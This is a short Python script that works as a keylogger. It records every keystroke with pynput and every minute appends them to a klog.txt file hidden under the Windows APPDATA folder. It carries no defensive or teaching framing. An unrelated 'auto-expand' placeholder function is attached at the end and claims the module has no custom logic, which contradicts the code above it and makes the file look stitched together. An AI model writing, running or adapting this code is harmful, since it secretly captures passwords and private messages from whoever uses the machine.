
import pynput.keyboard
import os
import threading

log_dir = os.path.join(os.getenv('APPDATA'), "logs")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "klog.txt")

log = ""

def write_log():
    global log
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(log)
    log = ""
    timer = threading.Timer(60, write_log)
    timer.daemon = True
    timer.start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f" [{key}] "

write_log()
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()


# === AUTO-EXPAND HOOK ===
def expand():
    print(f'[AUTO_EXPAND] Module {__file__} has no custom logic. Placeholder activated.')
